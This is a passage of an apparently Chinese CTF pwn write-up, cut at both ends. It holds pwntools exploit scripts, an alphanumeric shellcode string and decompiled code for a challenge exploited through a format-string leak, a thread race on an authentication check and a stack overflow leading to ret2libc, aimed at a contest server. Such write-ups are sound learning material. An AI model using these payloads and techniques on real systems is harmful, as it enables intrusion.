data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># debug('b *0x5555555555af')</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>shecode <span class=\"token operator\">=</span> <span class=\"token string\">'RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjxTYfi9W50t800T810T820T830T840T850T860T870T880T8A0T8B0T8C0T8F0T8G0t8I0t8L0t8S0T8T0T8U0T8V0T8W0T8b0T8g0T8hRAPZ0t8J0T8M0t8O0T8Y0T8cZRAQZ0T8eZRARZ0t8QZj9TYfi9k10t800T840T8RRAPZ0T8S0t8UZRAQZ0T81ZHpTTTTTTTTPHpwgm5fTTTH1QqHAfj7o1R1HfpTTZPjpAZjTo1RjVnjqXZP'</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>se<span class=\"token punctuation\">(</span>shecode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"offensive_security\"><a class=\"markdownIt-Anchor\" href=\"#offensive_security\">#</a> Offensive_Security</h4>\n<p>这道题还是比较精彩的，自我认为（</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208113032757.png\" alt=\"image-20241208113032757\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208113144210.png\" alt=\"image-20241208113144210\"></p>\n<p>login 属于 lib2shell 内函数</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208113302222.png\" alt=\"image-20241208113302222\"></p>\n<p>在这里面很明显有格式化字符串漏洞，利用此漏洞，泄露出 a1 内容即 password，顺便泄露出 libc 内容，为接下来做好工作。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208113502469.png\" alt=\"image-20241208113502469\"></p>\n<p>在 vuln 内创建了两个线程，guess 和 checker</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!] Guess the authentication code?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>authentication_code<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x1B[1;31m[CRITICAL]\\x1B[0m Invalid input.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">checker</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/random\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x1B[1;31m[CRITICAL]\\x1B[0m Failed to open /dev/random\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>authentication_code<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x1B[1;31m[CRITICAL]\\x1B[0m Failed to read from /dev/random\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!] Please enter your authentication code: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x1B[1;31m[CRITICAL]\\x1B[0m Invalid input.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">!=</span> authentication_code <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x1B[1;31m[CRITICAL]\\x1B[0m Two-factor authentication failed.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[\\x1B[1;32mINFO\\x1B[0m] Login success!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在线程竞争的漏洞，可以发现 guess 是往  <code>&amp;authentication_code</code>  输入内容，而 checker 是通过输入内容与  <code>&amp;authentication_code</code>  比较，比较相同则可以进入 shell 函数内。</p>\n<p>由于存在线程竞争漏洞，我们同时去输入，则可绕过 checker 的 if 判断</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  _BYTE s<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>明显的溢出，直接使用格式化字符串得到的 libc 进行 ret2libc 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># libc = './'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"125.70.243.22:31905\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token 